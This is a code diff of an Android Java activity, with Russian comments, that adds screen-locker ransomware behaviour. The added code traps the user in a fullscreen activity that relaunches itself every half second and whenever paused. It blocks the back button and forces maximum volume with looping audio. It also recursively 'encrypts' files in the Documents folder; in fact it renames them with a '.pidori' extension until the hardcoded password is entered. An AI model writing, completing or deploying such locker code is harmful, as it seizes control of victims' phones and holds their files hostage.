@@ -4,16 +4,26 @@ import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
 import android.media.AudioManager;
-import android.net.Uri;
+import android.media.MediaPlayer;
 import android.os.Bundle;
+import android.os.Environment;
+import android.os.Handler;
 import android.view.KeyEvent;
+import android.view.View;
 import android.view.WindowManager;
-import android.widget.VideoView;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+
+import java.io.File;
 
 public class LockActivity extends Activity {
 
-    private VideoView video;
+    private MediaPlayer mp;
     private AudioManager am;
+    private Handler handler = new Handler();
+    private boolean isUnlocked = false;
+    private File targetDir;
 
     @Override
     protected void onCreate(Bundle b) {
@@ -24,20 +34,104 @@ public class LockActivity extends Activity {
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
             WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
-            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
+            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+            WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
         am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-        am.setStreamVolume(AudioManager.STREAM_MUSIC,
-                am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
-
-        video = findViewById(R.id.lockVideo);
-        Uri uri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.lockvideo);
-        video.setVideoURI(uri);
-        video.setOnPreparedListener(mp -> {
+        mp = MediaPlayer.create(this, R.raw.lockvideo); // Твой mp3 (lockvideo.mp3)
+        if (mp != null) {
             mp.setLooping(true);
-            mp.setVolume(1f, 1f);
-            video.start();
+            mp.start();
+        }
+
+        // Запускаем шифрование в фоне (папка Documents)
+        targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                encryptFiles(targetDir);
+            }
+        }).start();
+
+        // Цикл громкости
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (!isUnlocked) {
+                    if (am != null) {
+                        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
+                    }
+                    Intent intent = new Intent(LockActivity.this, LockActivity.class);
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                    startActivity(intent);
+                }
+                handler.postDelayed(this, 500);
+            }
+        }, 500);
+
+        EditText passwordInput = findViewById(R.id.passwordInput);
+        Button unlockButton = findViewById(R.id.unlockButton);
+
+        unlockButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String password = passwordInput.getText().toString();
+                if (password.equals("pidori")) {
+                    isUnlocked = true;
+                    if (mp != null) {
+                        mp.stop();
+                        mp.release();
+                        mp = null;
+                    }
+                    // Запускаем расшифровку перед выходом
+                    new Thread(new Runnable() {
+                        @Override
+                        public void run() {
+                            decryptFiles(targetDir);
+                        }
+                    }).start();
+                    finish();
+                } else {
+                    Toast.makeText(LockActivity.this, "Неверный код", Toast.LENGTH_SHORT).show();
+                    passwordInput.setText("");
+                }
+            }
         });
+    }
+
+    private void encryptFiles(File dir) {
+        if (dir == null || !dir.exists()) return;
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File file : files) {
+            if (file.isDirectory()) {
+                encryptFiles(file);
+            } else if (file.isFile()) {
+                String name = file.getName();
+                if (!name.endsWith(".pidori") && !name.equals("lockvideo.mp3")) { // Себя не шифруем
+                    File newFile = new File(dir, name + ".pidori");
+                    file.renameTo(newFile);
+                }
+            }
+        }
+    }
+
+    private void decryptFiles(File dir) {
+        if (dir == null || !dir.exists()) return;
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File file : files) {
+            if (file.isDirectory()) {
+                decryptFiles(file);
+            } else if (file.isFile()) {
+                String name = file.getName();
+                if (name.endsWith(".pidori")) {
+                    String originalName = name.substring(0, name.length() - 7); // отрезаем .pidori
+                    File newFile = new File(dir, originalName);
+                    file.renameTo(newFile);
+                }
+            }
+        }
     }
 
     @Override
@@ -51,12 +145,26 @@ public class LockActivity extends Activity {
         return super.dispatchKeyEvent(e);
     }
 
-    @Override
-    public void onBackPressed() { }
+    @Override public void onBackPressed() { }
 
     @Override
     protected void onPause() {
         super.onPause();
-        startActivity(getIntent().addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+        if (!isUnlocked) {
+            Intent intent = new Intent(this, LockActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+            startActivity(intent);
+        }
     }
-                                    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        if (mp != null) {
+            mp.stop();
+            mp.release();
+            mp = null;
+        }
+        handler.removeCallbacksAndMessages(null);
+    }
+}
